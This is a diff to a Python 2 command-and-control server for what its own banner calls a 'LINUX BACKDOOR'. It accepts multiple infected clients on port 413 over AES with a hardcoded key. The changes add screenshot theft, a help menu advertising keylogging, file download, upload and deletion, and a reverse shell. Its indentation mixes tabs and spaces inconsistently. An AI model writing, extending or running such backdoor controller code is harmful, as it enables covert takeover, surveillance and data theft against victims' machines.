@@ -2,6 +2,7 @@
 
 from Crypto.Cipher import AES
 import socket, base64, os, time, sys, select
+import random
 
 # the block size for the cipher object; must be 16, 24, or 32 for AES
 BLOCK_SIZE = 32
@@ -12,7 +13,7 @@ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
 
 # generate a random secret key
-secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"
+secret = "abcdefghijklmnopqrstuvwxyz123456"
 
 # create a cipher object using the random secret
 # choose a secret IV as well and match on server+client
@@ -20,13 +21,14 @@ iv = '1111111111111111'
 cipher = AES.new(secret,AES.MODE_CFB,iv)
 
 # clear function
-##################################
-# Windows ---------------> cls
 # Linux   ---------------> clear
 clear = lambda: os.system('clear')
 
+#c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 # initialize socket
 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
 c.bind(('0.0.0.0', 413))
 c.listen(128)
 
@@ -59,8 +61,12 @@ def Receive(sock, end="EOFEOFEOFEOFEOFX"):
 # download file
 def download(sock, remote_filename, local_filename=None):
 	# check if file exists
+        print local_filename
+        if remote_filename=="screenshot.png":
+                local_filename=str(random.randint(1,100))+".png"
 	if not local_filename:
 		local_filename = remote_filename
+                
 	try:
 		f = open(local_filename, 'wb')
 	except IOError:
@@ -68,15 +74,26 @@ def download(sock, remote_filename, local_filename=None):
 		Send(sock, "cd .")
 		return
 	# start transfer
-	Send(sock, "download "+remote_filename)
-	print "Downloading: " + remote_filename + " > " + local_filename
-	time.sleep(interval)
-	fileData = Receive(sock)
-	print "> File size: " + str(len(fileData))
-	time.sleep(interval)
-	f.write(fileData)
-	time.sleep(interval)
-	f.close()
+        if remote_filename=="screenshot.png":
+            Send(sock,remote_filename)
+            print "Downloading: " + remote_filename + ">" +local_filename
+            time.sleep(interval)
+            fileData=Receive(sock)
+            print "> file size:"+str(len(fileData))
+            time.sleep(interval)
+            f.write(fileData)
+            time.sleep(interval)
+            f.close()
+        else:
+	    Send(sock, "download "+remote_filename)
+	    print "Downloading: " + remote_filename + " > " + local_filename
+	    time.sleep(interval)
+	    fileData = Receive(sock)
+	    print "> File size: " + str(len(fileData))
+	    time.sleep(interval)
+	    f.write(fileData)
+	    time.sleep(interval)
+	    f.close()
 
 # upload file
 def upload(sock, local_filename, remote_filename=None):
@@ -101,11 +118,20 @@ def upload(sock, local_filename, remote_filename=None):
 	time.sleep(interval)
 	Send(sock, "")
 	time.sleep(interval)
+#screenshot
+
+
 	
 # refresh clients
 def refresh():
 	clear()
+        try:
+            os.system("figlet -t -k LINUX BACKDOOR")
+        except:
+            os.system("apt-get install figlet")
+            os.system("figlet -t -k LINUX BACKDOOR")
 	print '\nListening for clients...\n'
+	
 	if len(clients) > 0:
 		for j in range(0,len(clients)):
 			print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
@@ -165,8 +191,34 @@ while True:
 		clear()
 		
 		print '\nActivating client: ' + clients[activate] + '\n'
-		active = True
-		Send(socks[activate], 'Activate')
+                
+                
+		while True:
+                    print "\ntype help command to view options:"
+                    print "\ntype shell to get a reverse shell:"
+                    data=raw_input()
+                    if data=="help":
+                        print "\n Description:"
+                        print "\n This is a simple back door tool for linux which  uses AES Encryption for secure transfer of data. This can be used as simple monitering tool. Creaters of this tool are not responsible if this tool is"
+                        print "misused. This tool supports multiple clients to connect. You can switch between the clients."
+                        print "\nusage:                    			options"
+                        print "\nlist of file names          		        ls"
+                        print "\nknow working directory   			pwd"
+                        print "\nchange directory         			cd"
+                        print "\ndownload a file          			download filename.extension"
+                        print "\nupload a file            			upload filename.extension"
+                        print "\ndelete a file            			delete filename.extension"
+                        print "\ntake a screenshot        			screenshot"
+                        print "\nstart http server on port 5000     start http"
+                        print "\nget key logs             			keylogger"
+                        print "\nto go back to list of clients                  quit     "
+                        print "\nterminate a client completely                  terminate\n\n"
+		    elif data=="shell":
+		        active = True
+		        Send(socks[activate], 'Activate')
+		        break
+		    else:
+		    	print "\nenter correct input"
 		
 	# interact with client
 	while active:
@@ -205,10 +257,14 @@ while True:
 			nextcmd = raw_input()
 		
 		# download
-		if nextcmd.startswith("download ") == True:
-			if len(nextcmd.split(' ')) > 2:
-				download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
-			else:
+		if nextcmd.startswith("download ") or nextcmd.endswith("screenshot") == True:
+                      
+			if len(nextcmd.split(' '))>2  :
+				download(socks[activate], nextcmd.split(' ')[1],nextcmd.split(' ')[2])
+                        elif nextcmd==("screenshot"):                                                           
+                               
+                                download(socks[activate],"screenshot.png")
+                        else:
 				download(socks[activate], nextcmd.split(' ')[1])
 		
 		# upload
@@ -220,4 +276,4 @@ while True:
 		
 		# normal command
 		elif nextcmd != '':
-			Send(socks[activate], nextcmd)
+                    Send(socks[activate], nextcmd)
